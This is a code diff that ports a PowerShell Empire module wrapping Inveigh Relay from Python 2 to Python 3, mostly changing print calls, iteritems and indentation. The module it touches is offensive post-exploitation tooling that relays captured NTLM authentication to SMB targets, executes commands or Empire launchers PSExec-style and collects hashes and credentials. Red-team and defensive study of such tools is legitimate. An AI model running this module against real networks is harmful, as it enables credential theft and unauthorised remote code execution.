@@ -1,6 +1,9 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 from lib.common import helpers
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -13,10 +16,10 @@ class Module:
                             'HTTP/Proxy NTLMv1/NTLMv2 authentication requests to an SMB target. If the '
                             'authentication is successfully relayed and the account has the correct '
                             'privilege, a specified command or Empire launcher will be executed on the '
-							'target PSExec style. This module works best while also running collection/inveigh '
-							'with HTTP disabled. Note that this module exposes only a subset of Inveigh '
-							'Relay\'s parameters. Inveigh Relay can be used through Empire\'s scriptimport '
-							'and scriptcmd if additional parameters are needed.'),
+                            'target PSExec style. This module works best while also running collection/inveigh '
+                            'with HTTP disabled. Note that this module exposes only a subset of Inveigh '
+                            'Relay\'s parameters. Inveigh Relay can be used through Empire\'s scriptimport '
+                            'and scriptcmd if additional parameters are needed.'),
 
             'Background' : True,
 
@@ -69,12 +72,12 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-			'ConsoleOutput' : {
+            'ConsoleOutput' : {
                 'Description'   :   '(Low/Medium/Y) Default = Y: Enable/Disable real time console output. Medium and Low can be used to reduce output.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-			'ConsoleStatus' : {
+            'ConsoleStatus' : {
                 'Description'   :   'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in Empire.',
                 'Required'      :   False,
                 'Value'         :   ''
@@ -99,17 +102,17 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-			'RunTime' : {
+            'RunTime' : {
                 'Description'   :   'Run time duration in minutes.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-			'Service' : {
+            'Service' : {
                 'Description'   :   'Default = 20 character random: Name of the service to create and delete on the target.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-			'SMB1' : {
+            'SMB1' : {
                 'Description'   :   '(Switch) Force SMB1.',
                 'Required'      :   False,
                 'Value'         :   ''
@@ -120,11 +123,11 @@ class Module:
                 'Value'         :   ''
             },
             'Usernames' : {
-                'Description'   :   'Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.',
+                'Description'   :   r'Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
-			'WPADAuth' : {
+            'WPADAuth' : {
                 'Description'   :   '(Anonymous/NTLM) HTTP listener authentication type for wpad.dat requests.',
                 'Required'      :   False,
                 'Value'         :   ''
@@ -159,7 +162,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -170,7 +173,7 @@ class Module:
         if command == "":
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
@@ -180,7 +183,7 @@ class Module:
         # set defaults for Empire
         scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)
 
-	for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "useragent" and option.lower() != "proxy_" and option.lower() != "proxycreds" and option.lower() != "command":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
